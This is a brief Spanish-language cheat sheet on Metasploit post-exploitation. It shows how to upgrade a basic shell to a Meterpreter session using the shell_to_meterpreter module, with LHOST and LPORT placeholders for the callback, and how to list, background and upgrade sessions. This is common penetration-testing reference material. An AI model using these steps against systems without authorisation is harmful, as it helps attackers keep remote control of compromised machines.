Técnicas para interactuar, mejorar y mantener acceso en un sistema comprometido.

• Mejorar shells  
• Gestionar sesiones  
• Escalar acceso

## Shell to Meterpreter

Convierte una shell básica en una sesión Meterpreter.

```
use post/multi/manage/shell_to_meterpreter
```
	set SESSION ID
	set LHOST IP
	set LPORT 4444

## Gestión de sesiones

Listar sesiones activas:

	sessions
	
Enviar sesión a background:

	background
	
Actualizar sesión:

	sessions -u 1
